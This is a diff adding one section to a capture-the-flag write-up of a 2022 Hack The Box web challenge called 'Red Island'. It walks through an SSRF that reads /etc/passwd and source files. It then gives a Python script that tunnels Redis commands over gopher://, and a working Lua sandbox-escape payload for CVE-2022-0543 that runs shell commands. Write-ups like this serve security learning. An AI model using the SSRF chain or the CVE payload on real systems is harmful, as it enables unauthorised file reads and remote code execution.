@@ -486,6 +486,130 @@ And we get our link file at `/static/flag` ! Flag: `HTB{des3r1aliz3_4ll_th3_th1n
 <br/>
 
 6. <p name="web6">Red Island (★★☆☆)</p>
+This was one of my favorite challenges, I spent a while in order to solve this. As a start, we didn't get any source code for this one but if you're familliar with Redis, you will be able to understand the challenge name. If not, no worries, I had no clue either.
+
+We started in a signup/login page:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/login_web6.png'>
+</p>
+
+After connecting, we get the following home page:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/home_web6.png'>
+</p>
+
+We could load any picture url using the home page, so as a begining, we try to load a random url (Not a picture) & it gives us an error: `Unknown error occured while fetching the image file: `
+
+So, this could be a potential SSRF. If we try `file:///etc/passwd`, we'll successfully receive the `passwd` file from the machine.
+
+This is a good start. Now, we can get our source file. Looking at the url route, there is a high chance that this is a node js app, so I tried my luck & used `file:///app/index.js` & I successfully got the [index.js](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/Red%20Island/index.js) file:
+
+```js
+const express = require('express'); 
+const app = express(); 
+const session = require('express-session'); 
+const RedisStore = require("connect-redis")(session) 
+const path = require('path'); 
+const cookieParser = require('cookie-parser'); 
+const nunjucks = require('nunjucks'); 
+const routes = require('./routes'); 
+const Database = require('./database'); 
+const { createClient } = require("redis") 
+const redisClient = createClient({ legacyMode: true }) 
+const db = new Database('redisland.db'); 
+
+app.use(express.json()); 
+app.use(cookieParser()); 
+
+redisClient.connect().catch(console.error)
+
+app.use( session({ 
+	store: new RedisStore({ client: redisClient }), 
+	saveUninitialized: false, secret: "r4yh4nb34t5B1gM4c", resave: false, 
+}));
+....
+```
+
+To be sure, I also leaked a couple more source files, If you're interested you can find them [here](/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/sources/Red%20Island/) but we'll not be needing them now.
+
+So looking at the source, we see a Redis database & a session secret. Sadly, there is no admin account so we got nothing to do with it.
+
+At the start of the challenge, I didn't actually know what Redis is, so I had to google for a while to understand how it works & what are the known methods to exploit it. I ended up spending 2 to 3 hours attempting to send a module to the remote using the Master-Slave technique but I failed. At this time, I made a script to send redis commands to the server.
+
+```python
+import requests
+import os
+
+
+def encodeChar(c):
+ if c == ' ':
+  return '%20' 
+ if c == '\n':
+  return '%0a' 
+ return c
+
+
+def getResp(r):
+ resp = r.content.decode()
+ resp = resp.replace('{"message":"', '')[:-2].replace('\\r\\n', '\n').replace('Unknown error occured while fetching the image file: ', '')
+ return resp
+
+
+def urlEncode(s): # Encode redis commands
+ return ''.join([encodeChar(x) for x in s])
+
+
+def execCmd(cmd):
+ # Manually edit the session cookie
+ cookie = "connect.sid=s%3A1algRY5pNOqG9dlgwqICKg3qtHssGQAM.W3Cuqv%2BLO0mnacWhPEqBcRNBYSH6r5MZUq125IK2CqA"
+ url = "http://138.68.188.223:30153"
+ 
+ urlbody = urlEncode("gopher://127.0.0.1:6379/a"+cmd+"\nquit")
+ body = {"url":urlbody}
+ r = requests.post(url+'/api/red/generate', headers={'Cookie': cookie}, json=body)
+ return getResp(r)
+
+
+while True:
+ cmd = input('> ')
+ print(execCmd(cmd))
+
+```
+
+Also, when looking around, I realized that we have root access with the Redis cli. Meanwhile, the web app had no root access. In fact, the flag was located in `/root/flag` & I wasn't able to get it using the LFI. I was able to find the correct path using `config set dir /root/flag` command, since it gives a different output if the given path is a file, not actually a folder.
+
+At this point I had to move on & find something else, & luckly, I landed on a recent CVE: `CVE-2022-0543` that involved a lua sandbox escape.
+
+For the sake of information, Redis is an in-memory database which provides a command (`EVAL`) to execute Lua script in a sandboxed environment, not allowing any command executions or reading/writing files. The sandbox escape is caused by the `package` variable, which is automatically initialized, which allowed access to arbitrary lua functions & this leads to a an arbitrary code execution. ([Red](https://thesecmaster.com/how-to-fix-cve-2022-0543-a-critical-lua-sandbox-escape-vulnerability-in-redis/))
+
+So using this, we can pop our shell! & we also got a ready proof of concept in the link above so if we change it a little bit to grab our flag (Or get an RCE, we can do anything at this point):
+
+Lua script:
+```lua
+local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");
+local io = io_l();
+local f = io.popen("cat /root/flag", "r"); 
+local res = f:read("*a"); 
+f:close(); 
+return res
+```
+
+Payload:
+```lua
+eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("cat /root/flag", "r"); local res = f:read("*a"); f:close(); return res' 0
+```
+
+We get our flag:
+
+<p align="center">
+    <img src='/2022/Hack%20The%20Box%20-%20Cyber%20Apocalypse/img/flag_web6.png'>
+</p>
+
+`HTB{r3d_righ7_h4nd_t0_th3_r3dis_land!}`
+
+<br/>
 
 7. <p name="web7">Mutation Lab (★★☆☆)</p>
 
